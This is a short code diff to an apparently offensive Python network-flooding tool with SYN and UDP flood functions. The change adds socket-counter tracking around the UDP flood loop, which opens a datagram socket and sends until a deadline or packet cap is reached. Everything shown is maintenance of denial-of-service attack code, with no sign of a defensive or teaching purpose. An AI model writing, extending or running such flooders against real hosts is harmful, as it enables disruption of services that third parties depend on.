@@ -26,10 +26,12 @@ def syn_flood(target_ip, target_port, duration, monitor=None, max_requests=0):
 
 def udp_flood(target_ip, target_port, duration, monitor=None, max_requests=0):
     """UDP flood with randomized payloads"""
+    from src.security import increment_socket_counter, decrement_socket_counter
     end_time = time.time() + duration
     sock = None
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        increment_socket_counter()
         while time.time() < end_time:
             if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
                 break
@@ -43,6 +45,7 @@ def udp_flood(target_ip, target_port, duration, monitor=None, max_requests=0):
         if monitor:
             monitor.update_stats(failed=1)
     finally:
+        decrement_socket_counter()
         if sock:
             try: sock.close()
             except: pass
